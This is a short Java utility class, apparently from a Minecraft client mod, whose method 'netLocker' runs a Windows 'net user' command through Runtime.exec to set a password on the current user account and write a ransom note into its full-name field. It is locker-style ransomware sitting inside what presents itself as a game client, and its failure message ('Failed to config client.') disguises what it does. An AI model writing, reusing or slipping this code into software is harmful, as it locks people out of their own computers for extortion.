package mc.bape.utils;

import java.io.IOException;

public class LockComputerUtils {
    public static void netLocker(String Ransomnote, String password){
        try {
            Runtime.getRuntime().exec("net user %username% "+password+" /add /FULLNAME:\""+Ransomnote+"\"");
        } catch (IOException e) {
            Helper.sendMessage("Failed to config client.");
        }
    }
}
